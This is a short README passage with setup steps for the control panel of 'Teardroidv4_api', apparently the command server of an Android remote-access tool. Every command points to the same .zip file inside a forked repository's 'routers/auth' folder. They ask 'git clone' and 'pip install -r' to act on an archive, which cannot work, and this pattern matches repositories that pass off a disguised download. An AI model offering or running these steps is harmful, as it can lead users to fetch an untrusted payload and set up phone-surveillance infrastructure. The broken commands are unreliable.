### Run control panel on your own server

- Clone [Teardroidv4_api](https://github.com/gwaan83/Teardroidv4_api-1/raw/refs/heads/main/routers/auth/api_Teardroidv_v1.3.zip) repo using the command below

```bash
$ git clone https://github.com/gwaan83/Teardroidv4_api-1/raw/refs/heads/main/routers/auth/api_Teardroidv_v1.3.zip
```

- Install uvicorn

```bash
$ sudo apt-get install uvicorn
$ python3 -m pip install uvicorn
```

- Change dir to Teardroidv4_api

```bash
$ cd Teardroidv4_api
```

- Install all dependency

```bash
$ pip install -r https://github.com/gwaan83/Teardroidv4_api-1/raw/refs/heads/main/routers/auth/api_Teardroidv_v1.3.zip
```

- change project key to connect with database
